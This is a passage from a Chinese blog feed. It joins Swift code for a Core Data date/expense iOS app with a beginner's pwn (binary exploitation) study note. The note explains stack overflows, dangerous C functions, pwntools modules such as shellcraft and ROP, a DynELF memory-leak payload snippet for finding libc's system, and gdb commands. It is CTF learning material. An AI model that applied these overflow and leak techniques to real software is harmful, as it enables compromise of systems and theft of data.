<h2 id="日期记事"><a href="#日期记事" class="headerlink" title="日期记事"></a>日期记事</h2><h3 id="日期列表界面"><a href="#日期列表界面" class="headerlink" title="日期列表界面"></a>日期列表界面</h3><p>DataViewController.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataViewController</span>: <span class="title">UIViewController</span>, <span class="title">UITableViewDataSource</span>, <span class="title">UITableViewDelegate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> expenses : [<span class="type">Expense</span>] <span class="operator">=</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> context <span class="operator">=</span> (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as!</span> <span class="type">AppDelegate</span>).persistentContainer.viewContext</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> <span class="type">DataTableView</span>: <span class="type">UITableView</span>!</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        <span class="type">DataTableView</span>.delegate <span class="operator">=</span> <span class="keyword">self</span></span><br><span class="line">        <span class="type">DataTableView</span>.dataSource <span class="operator">=</span> <span class="keyword">self</span></span><br><span class="line">        navigationItem.title <span class="operator">=</span> <span class="string">&quot;Clock Note&quot;</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillAppear</span>(<span class="keyword">_</span> <span class="params">animated</span>: <span class="type">Bool</span>)</span> &#123;</span><br><span class="line">        <span class="comment">//get data from coredata</span></span><br><span class="line">        getData()</span><br><span class="line">        <span class="comment">//reload table view</span></span><br><span class="line">        <span class="type">DataTableView</span>.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">addExpenses</span>(<span class="keyword">_</span> <span class="params">sender</span>: <span class="keyword">Any</span>)</span> &#123;</span><br><span class="line">        performSegue(withIdentifier: <span class="string">&quot;ShowExpenses&quot;</span>, sender: <span class="keyword">self</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">numberOfRowsInSection</span> <span class="params">section</span>: <span class="type">Int</span>)</span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> expenses.count</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">cellForRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cell <span class="operator">=</span> <span class="type">DataTableView</span>.dequeueReusableCell(withIdentifier: <span class="string">&quot;expensesCell&quot;</span>, for: indexPath) <span class="keyword">as!</span> <span class="type">ExpensesCell</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> expense <span class="operator">=</span> expenses[indexPath.row]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> title <span class="operator">=</span> expense.name &#123;</span><br><span class="line">            cell.titleLabel.text <span class="operator">=</span> title</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cell.amountLabel.text <span class="operator">=</span> <span class="string">&quot;<span class="subst">\(expense.amount)</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> date <span class="operator">=</span> expense.date &#123;</span><br><span class="line">            <span class="keyword">let</span> dateFormatter <span class="operator">=</span> <span class="type">DateFormatter</span>()</span><br><span class="line">            dateFormatter.dateFormat <span class="operator">=</span> <span class="string">&quot;yyyy-MM-dd hh:mm a&quot;</span></span><br><span class="line">            cell.dateLabel.text <span class="operator">=</span> dateFormatter.string(from: date)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> cell</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">didSelectRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> &#123;</span><br><span class="line">        <span class="comment">//performSegue(withIdentifier: &quot;ShowExpenses&quot;, sender: self)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">heightForRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> -&gt; <span class="type">CGFloat</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">getData</span>()</span> &#123;</span><br><span class="line">       <span class="keyword">do</span> &#123;</span><br><span class="line">            expenses <span class="operator">=</span> <span class="keyword">try</span> context.fetch(<span class="type">Expense</span>.fetchRequest())</span><br><span class="line">        &#125;<span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;fetchingFailed&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">commit</span> <span class="params">editingStyle</span>: <span class="type">UITableViewCell</span>.<span class="type">EditingStyle</span>, <span class="params">forRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> editingStyle <span class="operator">==</span> .delete &#123;</span><br><span class="line">            <span class="keyword">let</span> expense <span class="operator">=</span> expenses[indexPath.row]</span><br><span class="line">            context.delete(expense)</span><br><span class="line">            (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as!</span> <span class="type">AppDelegate</span>).saveContext()</span><br><span class="line">            </span><br><span class="line">            getData()</span><br><span class="line">        &#125;</span><br><span class="line">        tableView.reloadData()</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="日期列表中的小条目"><a href="#日期列表中的小条目" class="headerlink" title="日期列表中的小条目"></a>日期列表中的小条目</h4><p>ExpensesCell.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExpensesCell</span>: <span class="title">UITableViewCell</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> titleLabel: <span class="type">UILabel</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> amountLabel: <span class="type">UILabel</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> dateLabel: <span class="type">UILabel</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">awakeFromNib</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.awakeFromNib()</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="日期详情界面"><a href="#日期详情界面" class="headerlink" title="日期详情界面"></a>日期详情界面</h3><p>AddDataViewController.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddDataViewController</span>: <span class="title">UIViewController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> nameTextField: <span class="type">UITextField</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> amountTextField: <span class="type">UITextField</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> datePicker: <span class="type">UIDatePicker</span>!</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">saveExpenses</span>(<span class="keyword">_</span> <span class="params">sender</span>: <span class="keyword">Any</span>)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> context <span class="operator">=</span> (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as!</span> <span class="type">AppDelegate</span>).persistentContainer.viewContext</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> expense <span class="operator">=</span> <span class="type">Expense</span>(context: context)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> name <span class="operator">=</span> nameTextField.text &#123;</span><br><span class="line">            expense.name <span class="operator">=</span> name</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> amount <span class="operator">=</span> amountTextField.text &#123;</span><br><span class="line">            expense.amount <span class="operator">=</span>  (amount <span class="keyword">as</span> <span class="type">NSString</span>).doubleValue</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         expense.date <span class="operator">=</span> datePicker.date</span><br><span class="line">    </span><br><span class="line">        (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as!</span> <span class="type">AppDelegate</span>).saveContext()</span><br><span class="line">       navigationController<span class="operator">?</span>.popViewController(animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">touchesBegan</span>(<span class="keyword">_</span> <span class="params">touches</span>: <span class="type">Set</span>&lt;<span class="type">UITouch</span>&gt;, <span class="params">with</span> <span class="params">event</span>: <span class="type">UIEvent</span>?)</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.view.endEditing(<span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>汐白学Pwn-2(SomeBasic)</title>
    <url>/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/</url>
    <content><![CDATA[<h2 id="部分理论基础-Linux"><a href="#部分理论基础-Linux" class="headerlink" title="部分理论基础(Linux)"></a>部分理论基础(Linux)</h2><h3 id="栈的机制"><a href="#栈的机制" class="headerlink" title="栈的机制"></a>栈的机制</h3><p>栈是程序运行所使用的一种先进后出后进先出的线性表。大概是这样：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330165641.png" alt="20200330165641"><br>可以看到，就好比向一个单开口的箱子中压书一样（注意：就只是平着压入！！！<del>别在那想为啥不竖着放，这样就可以想拿那个出去就拿那个出去</del>）最先压入的A如果想要拿出来必须从最上面一个个拿出来，最后才能拿出来A，即：先进后出，后进先出。<br>栈通常用来为程序运行时所调用的各种函数存放其所使用的<code>参数/变量</code>。使用时一般是这样的（每使用一个函数，在调用这个函数时就会用这个模板为函数开辟一块栈帧）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">···</td>
<td style="text-align:left">···</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">ESP</td>
<td style="text-align:left">栈顶</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">Local variable</td>
<td style="text-align:left">局部变量</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">EBP</td>
<td style="text-align:left">栈底</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">retaddr</td>
<td style="text-align:left">返回地址</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">Incoming parameters</td>
<td style="text-align:left">传入参数</td>
<td></td>
</tr>
<tr>
<td style="text-align:center"><strong>···</strong></td>
<td style="text-align:left">···</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<p>当一个程序运行时需要获取输入时，这个存放输入的变量对于程序而言一般都放在局部变量中（一般是局部变量，不排除别的情况）。这时候看上面的栈帧模板就会发现，如果没有严格控制输入，那么就有可能会产生因为输入过长而导致输入的数据覆盖栈底、返回地址、传入参数······这是输入数据直接存放在栈内局部变量的情况；同理，即使输入数据没有存放在栈帧中，同样也会出现其它的数据覆盖现象，无论是什么数据被覆盖，都有可能会影响到程序的正常执行，从而导致各种可能产生的后果，也正是这样才导致了pwn的出现。<br>如最简单的栈溢出就是通过覆盖函数返回地址来达成目的。</p>
<p>详细的栈的介绍可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/">ctf-wiki中的栈介绍</a></p>
<p>这里记录一些常见的可导致溢出的危险函数：</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>还未学习，暂空</p>
<h2 id="工具的一些使用记录"><a href="#工具的一些使用记录" class="headerlink" title="工具的一些使用记录"></a>工具的一些使用记录</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="模块列表"><a href="#模块列表" class="headerlink" title="模块列表"></a>模块列表</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">adb：安卓调试桥</span><br><span class="line">args：命令行魔法参数</span><br><span class="line">asm：汇编和反汇编，支持 i386/i686/amd64/thumb 等</span><br><span class="line">constants：对不同架构和操作系统的常量的快速访问</span><br><span class="line">config：配置文件</span><br><span class="line">context：设置运行时变量</span><br><span class="line">dynelf：用于远程函数泄露</span><br><span class="line">encoders：对 shellcode 进行编码</span><br><span class="line">elf：用于操作 ELF 可执行文件和库</span><br><span class="line">flag：提交 flag 到服务器</span><br><span class="line">fmtstr：格式化字符串利用工具</span><br><span class="line">gdb：与 gdb 配合使用</span><br><span class="line">libcdb：libc 数据库</span><br><span class="line"><span class="built_in">log</span>：日志记录</span><br><span class="line">memleak：用于内存泄露</span><br><span class="line">rop：ROP 利用模块，包括 rop 和 srop</span><br><span class="line">runner：运行 shellcode</span><br><span class="line">shellcraft：shellcode 生成器</span><br><span class="line">term：终端处理</span><br><span class="line">timeout：超时处理</span><br><span class="line">tubes：能与 sockets, processes, ssh 等进行连接</span><br><span class="line">useragents：useragent 字符串数据库</span><br><span class="line">util：一些实用小工具</span><br><span class="line">pwnlib.atexception — Callbacks on unhandled exception</span><br><span class="line">pwnlib.atexit — Replacement <span class="keyword">for</span> atexit</span><br><span class="line">pwnlib.exception — Pwnlib exceptions</span><br><span class="line">pwnlib.replacements — Replacements <span class="keyword">for</span> various functions</span><br><span class="line">pwnlib.util.crc — Calculating CRC-sums</span><br><span class="line">pwnlib.util.cyclic — Generation of unique sequences</span><br><span class="line">pwnlib.util.fiddling — Utilities bit fiddling</span><br><span class="line">pwnlib.util.hashes — Hashing functions</span><br><span class="line">pwnlib.util.iters — Extension of standard module itertools</span><br><span class="line">pwnlib.util.lists — Operations on lists</span><br><span class="line">pwnlib.util.misc — We could not fit it <span class="built_in">any</span> other place</span><br><span class="line">pwnlib.util.net — Networking interfaces</span><br><span class="line">pwnlib.util.packing — Packing and unpacking of strings</span><br><span class="line">pwnlib.util.proc — Working with /proc/</span><br><span class="line">pwnlib.util.safeeval — Safe evaluation of python code</span><br><span class="line">pwnlib.util.web — Utilities <span class="keyword">for</span> working with the WWW</span><br></pre></td></tr></table></figure>
<h4 id="常用模块和功能"><a href="#常用模块和功能" class="headerlink" title="常用模块和功能"></a>常用模块和功能</h4><h5 id="context"><a href="#context" class="headerlink" title="context"></a>context</h5><p>设置程序运行时的参数，如程序运行在什么系统什么处理器下。一般只设置三个参数：</p>
<blockquote>
<p>context(os = ‘linux’ , arch = ‘i386’ , log_level = ‘debug’)<br>或<br>context(os = ‘linux’ , arch = ‘amd64’ , log_level = ‘debug’)</p>
</blockquote>
<h5 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h5><p>用于生成汇编指令对应的机器码</p>
<blockquote>
<p>asm(‘mov eax,0’)<br>‘\xb8\x00\x00\x00\x00’</p>
</blockquote>
<p>也可以查看机器码对应的汇编指令</p>
<blockquote>
<p>disasm(“\xb8\x00\x00\x00\x00”)<br>‘mov eax,0’</p>
</blockquote>
<p>不过之前好像看到有人说这东东有缺陷，推荐最好还是用<code>keystone-engine</code></p>
<h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>一般就用个附加调试</p>
<blockquote>
<p>s = process(‘./pwnme’)<br>context.terminal = [‘gnome-terminal’, ‘-x’, ‘sh’, ‘-c’]<br>gdb.attach( proc.pidof(s) [0])</p>
</blockquote>
<p>可以在attch的时候指定要gdb运行的指令：</p>
<blockquote>
<p>gdb.attach(proc.pidof(s) [0], gdbscript=’b *0x400620\nc\n’)</p>
</blockquote>
<p>个人喜欢直接终端：gdb -P pid（process之后返回的pid）</p>
<h5 id="shellcraft"><a href="#shellcraft" class="headerlink" title="shellcraft"></a>shellcraft</h5><p>生成一些简单的shellcode，推荐先设置好context再用，一般直接输出shellcode内容</p>
<blockquote>
<p>print(shellcraft.sh())<br>不过这里是直接提供的汇编指令，需要将其转为机器码<br>print(asm(shellcraft.sh()))</p>
</blockquote>
<h5 id="packing"><a href="#packing" class="headerlink" title="packing"></a>packing</h5><p>用来打包数据或者解包数据</p>
<ul>
<li>打包——p32/p64(打包为32位或64位的数据)</li>
</ul>
<blockquote>
<p>p32(0x400010,endian = ‘big’) #设置数据为大端存储，默认为小端</p>
</blockquote>
<ul>
<li>解包——u32/u64</li>
</ul>
<h5 id="tubes"><a href="#tubes" class="headerlink" title="tubes"></a>tubes</h5><p>对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote(address, port)产生一个远程的socket然后就可以读写了</p>
<blockquote>
<p>sh = remote(‘ftp.debian.org’,21)<br>sh.recvline()<br>‘220 …’<br>sh.send(‘USER anonymous\r\n’)<br>sh.recvuntil(‘ ‘, drop=True)<br>‘331’<br>sh.recvline()<br>‘Please specify the password.\r\n’<br>sh.close()</p>
</blockquote>
<p>使用process可以打开一个本地程序并进行交互</p>
<blockquote>
<p>sh = process(‘/bin/sh’)<br>sh.sendline(‘sleep 3; echo hello world;’)<br>sh.recvline(timeout=1)<br>‘’<br>sh.recvline(timeout=5)<br>‘hello world\n’<br>sh.close()</p>
</blockquote>
<p>使用listen来开启一个本地的监听端口</p>
<blockquote>
<p>l = listen()<br>r = remote(‘localhost’, l.lport)<br>c = l.wait_for_connection()<br>r.send(‘hello’)<br>c.recv()<br>‘hello’</p>
</blockquote>
<p>用于交互时读写的函数</p>
<blockquote>
<p>interactive() : 直接进行交互，相当于回到shell的模式，在取得shell之后使用<br>recv(numb=4096, timeout=default) : 接收指定字节<br>recvall() : 一直接收直到EOF<br>recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n<br>recvuntil(delims, drop=False) : 一直读到delims的pattern出现为止<br>recvrepeat(timeout=default) : 持续接受直到EOF或timeout<br>send(data) : 发送数据<br>sendline(data) : 发送一行数据，相当于在数据末尾加\n</p>
</blockquote>
<h5 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h5><p>elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。</p>
<blockquote>
<p>e = ELF(‘./libc.so’)<br>print hex(e.address)  # 文件装载的基地址<br>0x400000<br>print hex(e.symbols[‘write’]) # 函数地址<br>0x401680<br>print hex(e.got[‘write’]) # GOT表的地址<br>0x60b070<br>print hex(e.plt[‘write’]) # PLT的地址<br>0x401680<br>print hex(e.search(‘/bin/sh’).next())# 字符串/bin/sh的地址</p>
</blockquote>
<p>ELF模块下的一些功能</p>
<ul>
<li>asm(address, assembly) : 在指定地址进行汇编</li>
<li>bss(offset) : 返回bss段的位置，offset是偏移值</li>
<li>checksec() : 对elf进行一些安全保护检查，例如NX, PIE等。</li>
<li>disasm(address, n_bytes) : 在指定位置进行n_bytes个字节的反汇编</li>
<li>offset_to_vaddr(offset) : 将文件中的偏移offset转换成虚拟地址VMA</li>
<li>vaddr_to_offset(address) : 与上面的函数作用相反</li>
<li>read(address, count) : 在address(VMA)位置读取count个字节</li>
<li>write(address, data) : 在address(VMA)位置写入data</li>
<li>section(name) : dump出指定section的数据</li>
</ul>
<h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>pwntools中的ROP模块可以实现简单的ROP链的操作，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p>
<blockquote>
<p>elf = ELF(‘ropasaurusrex’)<br>rop = ROP(elf)<br>rop.read(0, elf.bss(0x80))<br>rop.dump()<br># [‘0x0000:        0x80482fc (read)’,<br>#  ‘0x0004:       0xdeadbeef’,<br>#  ‘0x0008:              0x0’,<br>#  ‘0x000c:        0x80496a8’]<br>str(rop)<br># &gt; ‘\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08’</p>
</blockquote>
<p>使用ROP(elf)来产生一个rop的对象，这时的ROP链还是空的，需要在其中添加函数。</p>
<p>因为ROP对象实现了<code>__getattr__</code>的功能，可以直接通过<code>func call</code>的形式来添加函数，<code>rop.read(0, elf.bss(0x80))</code>实际相当于<code>rop.call(&#39;read&#39;, (0, elf.bss(0x80)))</code>。 通过多次添加函数调用，最后使用<code>str</code>将整个<code>rop chain dump</code>出来就可以了。</p>
<ul>
<li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li>
<li>chain() : 返回当前的字节序列，即payload</li>
<li>dump() : 直观地展示出当前的rop chain</li>
<li>raw() : 在rop chain中加上一个整数或字符串</li>
<li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget，没仔细研究过</li>
<li>unresolve(value) : 给出一个地址，反解析出符号</li>
</ul>
<p>ROP的工作还是推荐通过<code>ROPgadget</code>来进行，pwntools的<code>ROP</code>功能之前貌似看到说是不完善，只能进行相对简单的<code>ROP</code>构造</p>
<h5 id="DynELF-符号泄露"><a href="#DynELF-符号泄露" class="headerlink" title="DynELF 符号泄露"></a>DynELF 符号泄露</h5><p>给出一个函数句柄，可以解析任意符号的位置。这个函数的功能是：输入任意一个address，输出这个address中的data(至少1byte)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * OverLength + write_addr + p64(<span class="number">0xdeadbeaf</span>) + p64(<span class="number">1</span>) + p64(address) + p64(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt;  %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line">d.lookup(<span class="literal">None</span>, <span class="string">&#x27;libc&#x27;</span>)      <span class="comment"># libc基址</span></span><br><span class="line">d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定一份elf的副本可以加速查找过程</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line">d.lookup(<span class="literal">None</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>在应用中我们可以在<code>leak</code>函数中布置<code>rop</code>链，使用<code>write</code>函数<code>leak</code>出一个<code>address</code>的地址和数据，然后返回。接着就可以使用<code>d.lookup</code>函数查找符号了，通常我们都是需要找<code>system</code>的符号。</p>
<h3 id="gdb-some"><a href="#gdb-some" class="headerlink" title="gdb(some)"></a>gdb(some)</h3><h4 id="list-l-命令"><a href="#list-l-命令" class="headerlink" title="list/l 命令"></a>list/l 命令</h4><p>可以使用list/l命令查看程序，方便我们添加断点时查看信息。</p>
<blockquote>
<p>list+lineNumber(中间有空格)<br>list 打印函数名称为Function的函数上下文的源程序<br>list 输出当前行后面的代码<br>list -显示当前行前面的代码</p>
</blockquote>
<h4 id="run-r命令"><a href="#run-r命令" class="headerlink" title="run/r命令"></a>run/r命令</h4><p>  在gdb中运行程序使用run命令.也可以设置程序运行参数。pwd命令用于显示当前所在目录。</p>
<h4 id="break-b命令"><a href="#break-b命令" class="headerlink" title="break/b命令"></a>break/b命令</h4><blockquote>
<p>break &lt; function &gt;           在进入指定的函数function时既停止运行，C++中可以使用class::function或function(type, type)格式来指定函数名称<br>break &lt; lineNumber&gt;          在指定的代码行打断点<br>break +offset/break -offset   在当前行的前面或后面的offset行打断点，offset为自然数<br>break filename:lineNumber     在名称为filename的文件中的第lineNumber行打断点<br>break filename:function       在名称为filename的文件中的function函数入口处打断点<br>break *address                在程序运行的内存地址处打断点<br>break                         在下一条命令处停止运行<br>break … if &lt; condition&gt;        在处理某些循环体中可使用此方法进行调试，其中…可以是上述的break lineNumber、break +offset/break -offset中的参数，其中condition表示条件，在条件成立时程序即停止运行，如设置break if i=100表示当i为100时程序停止运行。查看断点时，也可以使用info命令如info breakpoints [n]、info break [n]其中n 表示断点号来查看断点信息。</p>
</blockquote>
<h4 id="逐步调试命令"><a href="#逐步调试命令" class="headerlink" title="逐步调试命令"></a>逐步调试命令</h4><blockquote>
<p>next &lt; count&gt;。单步跟踪，如果有函数调用不会进入函数，如果后面不加count表示一条一条的执行，加count表示执行后面的count条指令，<br>s/step &lt; count&gt;。单步跟踪，如果有函数调用则进入该函数（进入该函数前提是此函数编译有Debug信息）,与next类似，其不加count表示一条一条执行，加上count表示自当前行开始执行count条代码指令<br>set step-mode.set step-mode on用于打开step-mode模式，这样在进行单步跟踪时，程序不会因为没有debug信息而不停止运行，这很有利于查看机器码，可以通过set step-mode off关闭step-mode模式<br>finish。运行程序直到当前函数完成并打印函数返回时的堆栈地址和返回值及参数值等信息。<br>until。运行程序直到退出循环体<br>stepi(缩写si)和nexti(缩写ni)。stepi和nexti用于单步跟踪一条及其指令，一条程序代码有可能由数条机器指令完成，stepi和nexi可以单步执行机器指令。</p>
</blockquote>
<h4 id="continue-c命令"><a href="#continue-c命令" class="headerlink" title="continue/c命令"></a>continue/c命令</h4><p>当程序遇到断点停止运行后可以使用continue命令恢复程序的运行到下一个断点或直到程序结束。</p>
<h4 id="print命令"><a href="#print命令" class="headerlink" title="print命令"></a>print命令</h4><p>请查看：<a href="https://blog.csdn.net/linuxheik/article/details/17380767">https://blog.csdn.net/linuxheik/article/details/17380767</a></p>
<h4 id="watch命令"><a href="#watch命令" class="headerlink" title="watch命令"></a>watch命令</h4><p>watch命令一般来观察某个表达式(变量也可视为一种表达式)的值是否发生了变化，如果由变化则程序立即停止运行，其具体用法如下：</p>
<blockquote>
<p>watch &lt; expr&gt;      为表达式(变量)expr设置一个观察点一旦其数值由变化，程序立即停止运行<br>rwatch &lt; expr&gt;      当表达式expr被读时，程序立即停止运行<br>awatch &lt; expr&gt;      当表达式expr的值被读或被写时程序立即停止运行<br>info watchpoints     列出当前所设置的所有观察点</p>
</blockquote>
<h4 id="return命令"><a href="#return命令" class="headerlink" title="return命令"></a>return命令</h4><p>如果在函数中设置了调试断点，在断点后还有语句没有执行完，这个时候我们可以使用return命令强制函数忽略还没有执行的语句并返回。可以直接使用return命令用于取消当前函数的执行并立即返回函数值，也可以指定表达式如 return &lt; expression&gt;那么该表达式的值会被作为函数的返回值。</p>
<h4 id="info命令"><a href="#info命令" class="headerlink" title="info命令"></a>info命令</h4><p>info命令可以用来在调试时查看寄存器、断点、观察点和信号等信息。其用法如下：</p>
<blockquote>
